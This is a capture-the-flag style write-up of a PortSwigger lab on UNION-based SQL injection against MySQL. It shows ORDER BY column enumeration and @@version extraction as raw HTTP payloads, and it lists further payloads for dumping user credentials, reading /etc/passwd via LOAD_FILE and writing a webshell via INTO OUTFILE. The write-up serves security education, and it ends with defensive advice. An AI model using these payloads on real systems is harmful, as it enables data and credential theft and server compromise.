# Lab 5: SQL Injection Attack - Querying Database Type and Version on MySQL and Microsoft

## Executive Summary

This lab demonstrates SQL injection exploitation against a MySQL database where insufficient input validation in product category filtering enables database enumeration and version disclosure. Through systematic column enumeration using the `ORDER BY` technique and UNION-based injection with MySQL-specific syntax, I successfully determined the database structure (2 columns) and extracted critical version information using the `@@version` global variable. The disclosed version provides attackers with precise database fingerprinting intelligence for developing targeted exploits against known MySQL vulnerabilities.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | SQL Injection |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | SQL Injection - MySQL/MSSQL Database Enumeration |
| **Risk**               | High - Database Fingerprinting & Information Disclosure |
| **Completion**         | February 7, 2026 |

## Objective

Exploit SQL injection vulnerability to enumerate database structure, identify MySQL database type, and extract version information using database-specific syntax.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Repeater for payload testing
- URL encoding for payload delivery

**Target:** Product category filtering with MySQL database backend

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed lab environment displaying "SQL injection attack, querying the database type and version on MySQL and Microsoft" challenge.
<img width="1920" height="983" alt="LAB2_ss1" src="https://github.com/user-attachments/assets/99a5a16d-2088-43a4-b339-dfaa1c1131b3" />

*Lab 5 environment - MySQL/MSSQL SQL injection with Burp Suite Professional configured*

### 2. Attack Surface Identification

Navigated through product categories to identify SQL injection vectors and understand application filtering mechanism.

<img width="1920" height="983" alt="LAB2_ss2" src="https://github.com/user-attachments/assets/21cdfa4a-b139-4422-87a3-6972eb8c3e98" />

*Category browsing - Food & Drink, Gifts categories | GET requests captured showing category parameter*

**Available Categories:**
- Food & Drink
- Gifts
- Pets
- Other product categories

**Request Captured:**
```http
GET /filter?category=Gifts HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Backend SQL Query (Inferred):**
```sql
SELECT * FROM products WHERE category = 'Gifts'
```

**Attack Vector:** The `category` parameter directly filters database results, suggesting unsanitized incorporation into SQL WHERE clause.

### 3. SQL Injection Vulnerability Confirmation

Sent category request to Burp Repeater and tested for SQL injection vulnerability.

**Test Payload:**
```http
GET /filter?category=Gifts' HTTP/1.1
```

<img width="1920" height="983" alt="LAB2_ss3 0" src="https://github.com/user-attachments/assets/371dc13d-6702-4be1-84e8-4fb4c34b2ad1" />

*Single quote injection - Internal Server Error confirms SQL injection vulnerability*

**Response:** 500 Internal Server Error

**SQL Syntax Error (Triggered):**
```sql
SELECT * FROM products WHERE category = 'Gifts''
```

**Vulnerability Confirmed:** The single quote breaks SQL syntax, causing a database error. Application is vulnerable to SQL injection.

### 4. Column Count Enumeration - Column 1

Began systematic column enumeration using `ORDER BY` technique with MySQL comment syntax.

**Test Payload 1:**
```http
GET /filter?category=Gifts'+ORDER+BY+1%23 HTTP/1.1
```
<img width="1920" height="983" alt="LAB2_ss3 1" src="https://github.com/user-attachments/assets/4bc730b7-b80d-461d-ac41-b5b76dc269b4" />

*ORDER BY 1 test - 200 OK response with results displayed, confirming at least 1 column exists*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 1#'
```

**MySQL Comment Syntax:**
- `#` - MySQL single-line comment (equivalent to `--` in other databases)
- Comments out remaining query including the trailing single quote

**Response:** 200 OK with products displayed

**Analysis:** First column exists (query executes successfully).

### 5. Column Count Enumeration - Column 2

**Test Payload 2:**
```http
GET /filter?category=Gifts'+ORDER+BY+2%23 HTTP/1.1
```

<img width="1920" height="983" alt="LAB2_ss3 2" src="https://github.com/user-attachments/assets/7cbd963b-8bd9-46ef-8c00-4840bbfe21df" />

*ORDER BY 2 test - 200 OK response confirms 2 columns exist*

**Response:** 200 OK

**Analysis:** Second column exists (no error when ordering by column 2).

### 6. Column Count Limit Discovery

**Test Payload 3:**
```http
GET /filter?category=Gifts'+ORDER+BY+3%23 HTTP/1.1
```
<img width="1920" height="983" alt="LAB2_ss3 3" src="https://github.com/user-attachments/assets/6d74cadd-d4da-4021-8842-8d395367e39a" />

*ORDER BY 3 test - Internal Server Error confirms only 2 columns in result set*

**Response:** 500 Internal Server Error

**MySQL Error (Inferred):**
```
Unknown column '3' in 'order clause'
```

**Column Count Confirmed:** Exactly **2 columns** in the SELECT statement.

**UNION Requirement:** All subsequent UNION SELECT statements must return exactly 2 columns to match the original query structure.

### 7. Database Version Extraction

Crafted UNION injection payload to extract MySQL database version using the `@@version` global variable.

**MySQL Version Variables:**
- `@@version` - Returns MySQL server version
- `VERSION()` - Function that returns version (alternative method)

**Attack Payload:**
```http
GET /filter?category=Gifts'+UNION+SELECT+@@version,NULL%23 HTTP/1.1
```
<img width="1920" height="983" alt="LAB2_ss4" src="https://github.com/user-attachments/assets/23b35d92-a1b4-49a0-bcb9-1bbfb7db8340" />
<img width="1920" height="983" alt="LAB2_ss5" src="https://github.com/user-attachments/assets/4031747b-94d3-4f76-949b-3278c4c89362" />

*Database version extraction successful - Version displayed in webpage (highlighted in blue) and Burp response*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Gifts' 
UNION SELECT @@version, NULL#'
```

**Query Breakdown:**
- `category = 'Gifts'` - Returns legitimate products (may be empty)
- `UNION SELECT @@version, NULL` - Appends version information as second result set
- `@@version` - MySQL global variable containing version string
- `NULL` - Placeholder for second column (must match column count)
- `#` - Comments out trailing quote

**Version Information Extracted:**
```
8.0.36-0ubuntu0.20.04.1
```

**Database Fingerprint:**
- **Database Type:** MySQL
- **Version:** 8.0.36
- **Operating System:** Ubuntu 20.04 (indicated by package suffix)
- **Package:** Official Ubuntu repository build

**Complete Attack Success:**
- ✅ SQL injection vulnerability exploited
- ✅ Database structure enumerated (2 columns)
- ✅ Database type identified (MySQL)
- ✅ Exact version disclosed (8.0.36)
- ✅ Platform fingerprinted (Ubuntu 20.04)

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: High (CVSS 7.5)**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
```

**Primary Vulnerability:**

**CWE-89: SQL Injection**
- User input directly concatenated into SQL queries
- No parameterized queries or input sanitization
- Enables database enumeration and information disclosure

**Attack Chain:**
```
Product Category Filtering
        ↓
SQL Injection via category Parameter
        ↓
Vulnerability Confirmation (Syntax Error)
        ↓
Column Enumeration (ORDER BY 1,2,3)
        ↓
Column Count: 2 columns
        ↓
UNION Injection (@@version, NULL)
        ↓
MySQL Version Disclosed
        ↓
Database Fully Fingerprinted
```

**MySQL vs Oracle Syntax Differences:**

| Aspect | MySQL | Oracle | MSSQL |
|--------|-------|--------|-------|
| **Comment** | `#` or `--` | `--` | `--` |
| **Version** | `@@version` or `VERSION()` | `SELECT banner FROM v$version` | `@@version` |
| **NULL Select** | `SELECT NULL` | `SELECT NULL FROM dual` | `SELECT NULL` |
| **String Concat** | `CONCAT()` or `||` | `||` | `+` |

**Why Database Version is Critical:**

**1. Vulnerability Research:**
MySQL 8.0.36 known issues:
- CVE-2024-20960: Authentication bypass vulnerability
- CVE-2023-21980: Server component vulnerability
- Version-specific exploit modules available

**2. Attack Surface Expansion:**
With version knowledge, attackers can:
- Research applicable CVEs
- Identify missing security patches
- Select version-compatible exploits
- Plan privilege escalation paths

**3. MySQL-Specific Exploitation Techniques:**

**Information Gathering:**
```sql
-- Database name
SELECT database()

-- Current user
SELECT user()

-- List all databases
SELECT schema_name FROM information_schema.schemata

-- List all tables
SELECT table_name FROM information_schema.tables

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

**Data Exfiltration:**
```sql
-- Extract user credentials
' UNION SELECT username, password FROM users#

-- Read files (if FILE privilege exists)
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL#

-- Write files (if FILE privilege exists)
' UNION SELECT 'webshell', NULL INTO OUTFILE '/var/www/html/shell.php'#
```

**Real-World Impact:**

| Target | Consequence |
|--------|-------------|
| **E-Commerce** | Customer database extraction, payment card theft |
| **SaaS Platforms** | Multi-tenant data breach, complete database dump |
| **Financial Systems** | Account data theft, transaction manipulation |
| **Healthcare** | PHI exposure, medical record exfiltration |
| **Corporate** | Proprietary data theft, credential harvesting |

**Escalation Potential:**

**Phase 1 - Reconnaissance (Completed):**
- ✅ Database type: MySQL 8.0.36
- ✅ Platform: Ubuntu 20.04
- ✅ Column structure: 2 columns

**Phase 2 - Enumeration (Next Steps):**
- Extract database names
- Identify tables and columns
- Locate sensitive data (users, passwords, etc.)

**Phase 3 - Exploitation:**
- Extract credentials
- Read system files (if FILE privilege)
- Achieve remote code execution (if INTO OUTFILE works)

**Phase 4 - Post-Exploitation:**
- Lateral movement with extracted credentials
- Persistent backdoor installation
- Privilege escalation to root/system

## Key Takeaways

**Penetration Testing Methodology:**
- Systematic vulnerability confirmation
- Column enumeration using ORDER BY technique
- Database-specific syntax identification
- Version extraction using global variables
- Complete database fingerprinting

**Critical Security Insights:**

**1. Database Fingerprinting Enables Targeted Attacks:**
Version disclosure provides:
- Specific CVE targeting
- Exploit compatibility verification
- Attack technique selection
- Privilege escalation path identification

**2. MySQL-Specific Syntax Requirements:**

**Comment Syntax:**
```sql
-- MySQL accepts both
' ORDER BY 1#
' ORDER BY 1-- 

-- Note: -- requires space after it
' ORDER BY 1--   (space required)
' ORDER BY 1#    (no space needed)
```

**Version Extraction:**
```sql
-- MySQL method (used in lab)
' UNION SELECT @@version, NULL#

-- Alternative MySQL methods
' UNION SELECT VERSION(), NULL#
' UNION SELECT @@version_comment, NULL#
```

**3. Column Enumeration Techniques:**

**ORDER BY Method (Used):**
- Increment column number until error
- Error indicates exact column count
- Fast and reliable

**UNION NULL Method (Alternative):**
```sql
' UNION SELECT NULL#           (Error if ≠1 column)
' UNION SELECT NULL,NULL#      (Success if =2 columns)
' UNION SELECT NULL,NULL,NULL# (Error if ≠3 columns)
```

**4. URL Encoding Importance:**

All payloads were URL-encoded:
```
Space: %20
Hash:  %23
Quote: %27
```

This ensures:
- Proper HTTP transmission
- Bypass of basic filters
- Prevention of browser interpretation

**5. Defense-in-Depth Requirements:**

**Application Layer:**
- Parameterized queries (mandatory)
- Input validation and sanitization
- Least privilege database accounts
- Remove detailed error messages

**Database Layer:**
- Restrict information_schema access
- Disable FILE privilege for web users
- Enable query logging and monitoring
- Regular security updates

**Network Layer:**
- Web Application Firewall (WAF)
- Database firewall rules
- Intrusion detection systems

**Professional Skills Demonstrated:**
- SQL injection identification and exploitation
- Database-specific syntax knowledge (MySQL)
- Systematic column enumeration
- UNION-based injection techniques
- Database fingerprinting and version disclosure
- Attack methodology documentation

## References

1. PortSwigger Web Security Academy - SQL Injection
2. OWASP Top 10 (2021) - A03: Injection
3. CWE-89 - SQL Injection
4. MySQL 8.0 Reference Manual
5. OWASP SQL Injection Prevention Cheat Sheet

---

## Legal Notice

**Copyright © 2025 Gurpreet Singh**  
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to systems or exploitation of disclosed vulnerabilities is illegal under applicable laws worldwide.
